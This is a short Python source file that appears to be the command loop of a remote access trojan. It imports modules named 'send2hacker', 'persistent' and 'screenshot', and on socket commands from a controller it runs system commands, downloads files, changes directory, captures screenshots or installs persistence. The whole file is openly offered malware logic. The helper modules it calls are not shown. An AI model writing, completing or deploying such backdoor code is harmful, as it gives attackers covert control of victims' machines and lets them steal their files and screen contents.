from command import execute_command
from download import download_files
from send2hacker import upload_file_folders
from screenshot import capture_screenshot
from persistent import become_persistent


def handleConnection(my_socket):
    print ("[+] Handling connection")

    while True:
        user_input = my_socket.receive_data()

        print("[+] User input: ", user_input)

        my_socket.send_data(user_input)
        if user_input == "1":
            print("[+] Running system commands") 
            execute_command(my_socket)

        elif user_input == "2":
            print("[+] Downloading file")
            download_files(my_socket)

        elif user_input == "3":
            my_socket.change_dir()  

        elif user_input == "4":
            capture_screenshot(my_socket) 

        elif user_input == "5":
            become_persistent(my_socket)

        elif user_input == "99":
            break
        else:
            print("[+] Invalid input")
            

